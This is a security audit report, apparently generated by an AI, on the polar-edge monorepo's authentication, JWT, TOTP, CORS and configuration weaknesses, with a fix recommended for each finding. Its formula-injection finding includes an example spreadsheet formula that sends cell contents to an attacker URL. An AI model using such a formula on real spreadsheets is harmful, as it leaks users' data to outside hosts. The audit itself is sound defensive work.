# Security Audit Report — polar-edge

**Date:** 2026-02-20
**Scope:** Full codebase on `main` — `apps/scouting`, `apps/basecamp`, `apps/basecamp-fe`, and all `packages/`
**Auditor:** Automated (Claude)

---

## Executive Summary

This audit covers authentication, authorization, API security, data handling, secrets management, Docker configuration, and dependency posture across the polar-edge monorepo. The scouting app demonstrates generally strong security practices (consistent auth guards, Zod validation, parameterized ORM queries, proper HMAC token signing). The basecamp app has several critical and high-severity issues centered around its 2FA implementation and JWT configuration that should be addressed urgently.

**Findings by severity:**

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 4 |
| Medium | 7 |
| Low | 10 |
| Info | 3 |

---

## Critical Findings

### C1. TOTP Secret Leaked to Client and Stored in Non-HttpOnly Cookie

**App:** basecamp / basecamp-fe
**Files:**
- `apps/basecamp/src/attendance/twofa/twofa.controller.ts:31`
- `apps/basecamp-fe/src/lib/auth.ts:31-38`

The server's TOTP shared secret (`ATTENDANCE_2FA_SECRET`) is returned in the `/2fa/authenticate` JSON response body. The frontend then stores it in a cookie with `httpOnly: false`:

```typescript
// Server: returns the raw TOTP secret
return res.status(HttpStatus.ACCEPTED).json({ message: "Accepted", token, secret: totpSecret });

// Client: stores in a non-httpOnly cookie
cookieStore.set("toofaSecret", secret, { httpOnly: false, ... });
```

Any JavaScript running on the page (XSS, browser extensions) can read `document.cookie` and extract the secret, allowing indefinite generation of valid TOTP codes.

**Recommendation:** The TOTP secret must never leave the server. Rearchitect so the server validates TOTP codes server-side only.

---

### C2. JWT Tokens Have No Expiration

**App:** basecamp
**Files:**
- `apps/basecamp/src/attendance/attendance.module.ts:14-19`
- `apps/basecamp/src/attendance/twofa/twofa.controller.ts:26-28`

No `expiresIn` option is provided in either the module-level `signOptions` or individual `sign()` calls:

```typescript
signOptions: { algorithm: "HS256" },
// ...
const token = this.jwtService.sign({ sub: "attendance-2fa" });
```

Issued JWTs are valid forever until `JWT_SECRET` is rotated. A stolen token grants perpetual access.

**Recommendation:** Add `expiresIn: "8h"` (or appropriate duration) to the JWT sign options.

---

## High Severity Findings

### H1. Auth Password and TOTP Secret Are the Same Value

**App:** basecamp
**File:** `apps/basecamp/src/attendance/twofa/twofa.controller.ts:16-17,30`

The same `ATTENDANCE_2FA_SECRET` environment variable serves as both the login password and the TOTP shared secret. Knowing the password (transmitted in every auth request body) gives the attacker the TOTP secret, reducing "two-factor" authentication to a single factor.

**Recommendation:** Use two distinct environment variables: one for the password and a separate one for the TOTP secret.

---

### H2. JWT and TOTP Cookies Not Set as HttpOnly

**App:** basecamp-fe
**File:** `apps/basecamp-fe/src/lib/auth.ts:23-28,33-38`

Both the JWT token (`toofaToken`) and TOTP secret (`toofaSecret`) cookies are set with `httpOnly: false`, making them accessible to any client-side JavaScript.

**Recommendation:** Set `httpOnly: true` for the JWT cookie. For the TOTP secret, remove client-side storage entirely (see C1).

---

### H3. No CORS Configuration on Basecamp API

**App:** basecamp
**File:** `apps/basecamp/src/main.ts:4-7`

The NestJS application never calls `app.enableCors()`. If a reverse proxy adds permissive CORS headers, the sensitive `/2fa/authenticate` and `/2fa/validate` endpoints become accessible from any origin.

**Recommendation:** Explicitly configure CORS: `app.enableCors({ origin: 'https://your-frontend-domain.com' })`.

---

### H4. No Global Validation Pipe in Basecamp

**App:** basecamp
**File:** `apps/basecamp/src/main.ts`

Despite having DTO classes (`TwofaSignInDto`, `TwofaValidateDto`), no `ValidationPipe` is registered globally or at the controller level. Validation decorators are never enforced, allowing arbitrary data in request bodies.

**Recommendation:** Add `app.useGlobalPipes(new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true }))` in `main.ts`.

---

## Medium Severity Findings

### M1. Middleware Route Protection Is Dead Code (Scouting)

**App:** scouting
**File:** `apps/scouting/src/proxy.ts`

The `proxy.ts` file exports a middleware-like function that checks for session cookies on `/admin/*`, `/auto-path/*`, `/forms/*`, `/organization/*`, and `/profile/*` routes. However, there is **no `middleware.ts` file** in the project and `proxy.ts` is never imported anywhere. This means the route protection defined in proxy.ts is not active — it is dead code.

Additionally, `/analysis/*`, `/picklist/*`, and `/api/teams/search` routes were never included in the matcher, so even if the middleware were active, these routes would be unprotected at the middleware level.

All server actions independently validate auth, so the actual security impact is limited (defense-in-depth gap, not an authentication bypass), but the intent of having edge-level protection is not being fulfilled.

**Recommendation:** Create a proper `middleware.ts` file that imports and uses the proxy function, or remove the dead code to avoid a false sense of security.

---

### M2. No Brute-Force Protection on Basecamp Auth Endpoints

**App:** basecamp
**File:** `apps/basecamp/src/attendance/twofa/twofa.controller.ts:14-24`

No rate limiting, throttling, or lockout on `POST /2fa/authenticate`. No `@nestjs/throttler` or `helmet` middleware is applied.

**Recommendation:** Add `@nestjs/throttler` with appropriate limits. Apply `helmet` middleware for baseline HTTP security headers.

---

### M3. Timing-Unsafe Password Comparison

**App:** basecamp
**File:** `apps/basecamp/src/attendance/twofa/twofa.controller.ts:21`

```typescript
if (!password || password !== expectedPassword) {
```

Uses `!==` (non-constant-time) for password comparison, enabling potential timing side-channel attacks.

**Recommendation:** Use `crypto.timingSafeEqual()` for the comparison.

---

### M4. Weak TOTP Parameters (4 Digits, SHA-1)

**App:** basecamp + `@repo/twofa` package
**Files:**
- `apps/basecamp/src/attendance/twofa/twofa.service.ts:19-24`
- `packages/twofa/src/core/totp.ts` (defaults: `digits: 4`, `algorithm: 'sha1'`)

The TOTP uses only 4 digits (10,000 possible codes). With a window of 1 (3 valid periods simultaneously), this yields ~0.03% chance per guess. Without rate limiting, all codes could be tried within a single 30-second window.

**Recommendation:** Increase to 6 digits (industry standard, 1,000,000 possible codes). Consider SHA-256 for the algorithm.

---

### M5. OAuth Tokens Stored as Plaintext in Database

**App:** scouting
**File:** `apps/scouting/src/lib/database/schema/tables/account.ts`

The `account` table stores `accessToken`, `refreshToken`, and `idToken` as plaintext text columns. If the database is compromised, these tokens are directly exposed. This is Better Auth's default schema behavior.

**Recommendation:** Consider application-level encryption at rest for OAuth tokens, or accept this as a known risk with database-level encryption.

---

### M6. Google Sheets Formula Injection Risk

**App:** basecamp
**File:** `apps/basecamp/src/sheet/sheet.service.ts:76`

The Sheets API client uses `valueInputOption: "USER_ENTERED"` when appending rows. Since Discord display names (written to the `discordName` column) are user-controlled, an attacker could set their Discord nickname to a formula like `=IMPORTRANGE(...)` or `=IMAGE("https://attacker.com/exfil?data="&A1)` to exfiltrate data or cause unexpected behavior in the spreadsheet.

**Recommendation:** Switch to `valueInputOption: "RAW"` to prevent formula interpretation, or sanitize values by prefixing user-controlled strings with a single quote (`'`).

---

### M7. `@repo/twofa` Package Has No Replay Protection

**Package:** `@repo/twofa`
**File:** `packages/twofa/src/core/totp.ts`

`verifyTOTP` checks current ±1 window but has no used-code tracking. A valid code can be replayed multiple times within the same window. There is also no rate limiting in the package itself.

**Recommendation:** Consuming applications must implement used-code tracking (nonce store) and rate limiting.

---

## Low Severity Findings

### L1. `/api/teams/search` Has No Authentication

**App:** scouting
**File:** `apps/scouting/src/app/api/teams/search/route.ts`

This endpoint is fully public — no session or org check. Exposes the team name/number search index to unauthenticated requests.

**Recommendation:** Add authentication if the team data should be org-scoped. If team info is considered public (FRC teams are publicly known), document this as intentional.

---

### L2. No Limit on Invite Link Generation

**App:** scouting
**File:** `apps/scouting/src/lib/server/invite-links.ts`

No throttling on how many invite links an admin can generate. A compromised admin account could create many long-lived tokens.

**Recommendation:** Add a reasonable per-org rate limit on invite link creation.

---

### L3. Expired Invite Links Not Cleaned Up

**App:** scouting
**File:** `apps/scouting/src/lib/database/schema/tables/organization-invite-link.ts`

Invite link expiry is computed at read-time from `createdAt + 7 days`. No database expiry column exists, and expired links accumulate indefinitely.

**Recommendation:** Add periodic cleanup or a database-level expiry column.

---

### L4. Missing Environment Variables Not Caught at Startup

**App:** scouting
**Files:**
- `apps/scouting/src/lib/server/pit-photo-token.ts:8` — `PIT_PHOTO_TOKEN_SECRET` / `AUTH_SECRET`
- `apps/scouting/src/lib/server/tba.ts:13` — `TBA_API_KEY` (also missing from `.env.example`)
- `apps/scouting/src/lib/permissions.ts:1` — `ADMIN_EMAILS` (empty = zero super-admins, no warning)

Several critical environment variables are only checked at request time, not at startup. Missing values cause runtime failures rather than fail-fast behavior.

**Recommendation:** Validate all required environment variables at startup (e.g., in `instrumentation.ts`) and throw if missing.

---

### L5. Server Action Allowed Origins Hardcoded

**App:** scouting
**File:** `apps/scouting/next.config.ts:27-30`

```typescript
allowedOrigins: ["scout.yetirobotics.org", "scouting.svc.int.yukigamine.net", "localhost:3000"],
```

If the deployment domain changes, this list must be updated in source code.

**Recommendation:** Consider making this configurable via environment variable.

---

### L6. `.env` Files Not Fully Covered by `.gitignore`

**File:** `.gitignore`

The gitignore pattern `.env*.local` only covers files matching `*.local`. Bare `.env` files are not ignored. If someone creates `apps/scouting/.env`, it would be tracked by git.

**Recommendation:** Add `.env` and `**/.env` patterns to `.gitignore`.

---

### L7. Console Logging of Sensitive Error Information (Basecamp)

**App:** basecamp
**Files:** `apps/basecamp/src/attendance/twofa/twofa.controller.ts:22,40`

Uses `console.error` instead of NestJS `Logger`. Full JWT verification error objects are logged, which may include token content in stack traces.

**Recommendation:** Use the NestJS `Logger` service consistently.

---

### L8. `skipTwofa` Boolean Parameter Is Fragile

**App:** basecamp
**File:** `apps/basecamp/src/attendance/attendance.service.ts:229,259`

The `skipTwofa` parameter bypasses both TOTP verification and expired session checks. Any future caller could accidentally bypass 2FA.

**Recommendation:** Create separate `adminSignIn`/`adminSignOut` methods to make the bypass intent explicit.

---

### L9. Admin Role Check Uses Unsafe Type Assertion

**App:** basecamp
**File:** `apps/basecamp/src/bot/bot.commands.ts:200,249`

```typescript
const member = interaction.member as GuildMember;
```

Could mask null/undefined values in DM contexts.

**Recommendation:** Add a null check before the type assertion.

---

### L10. `@repo/twofa` Secret Encoding Is Non-Standard

**Package:** `@repo/twofa`
**File:** `packages/twofa/src/core/totp.ts:30`

Secrets are treated as raw UTF-8 strings (`Buffer.from(secret, "utf8")`), not Base32 (which standard authenticator apps expect). This makes the package incompatible with Google Authenticator, Authy, etc.

**Recommendation:** Add Base32 decoding support if authenticator app compatibility is needed.

---

## Informational

### I1. Docker Images Run as Non-Root User (Positive)

All three Dockerfiles (`scouting`, `basecamp`, `basecamp-fe`) create a non-root user and switch to it via `USER nextjs` / `USER nodejs`. Multi-stage builds also reduce the attack surface.

### I2. Database Queries Use Parameterized ORM

All SQL in the scouting app uses Drizzle ORM's `sql` tagged template literals, which parameterize interpolated values. No raw string concatenation was found in any database queries.

### I3. GitHub Actions Workflows Follow Least Privilege

- CI workflow uses `permissions: contents: read`
- Docker release workflow uses `permissions: contents: read, packages: write`
- No `pull_request_target` usage that could expose secrets to forks

---

## Positive Security Patterns Observed

- **Scouting app:** Consistent auth guard pattern across all server actions (session + org membership + permission check)
- **Scouting app:** Zod schema validation on all form submissions (`StandFormSchema`, `CreatePicklistSchema`, etc.)
- **Scouting app:** HMAC-SHA256 signed tokens with `timingSafeEqual` for pit photo access
- **Scouting app:** S3 presigned URLs with content-type whitelist and size limits for photo uploads
- **Scouting app:** Org-scoped data access — all queries filter by `activeMember.organizationId`
- **Scouting app:** Cross-org access prevention in member management (verifies target member belongs to caller's org)
- **Basecamp bot:** Ephemeral Discord replies for sensitive commands
- **Basecamp bot:** `allowedMentions: { parse: [] }` prevents mention injection through AI-generated content
- **Basecamp bot:** Rate limiting on the handbook AI command (3 uses per 60 seconds)
- **Basecamp:** Mutex-based concurrency control on Google Sheets append operations
- **No XSS vectors:** No `dangerouslySetInnerHTML`, `eval()`, `innerHTML`, or `document.write` usage found
- **No hardcoded secrets:** All secrets loaded from environment variables
- **`server-only` imports:** Used correctly to prevent server code leaking to client bundles
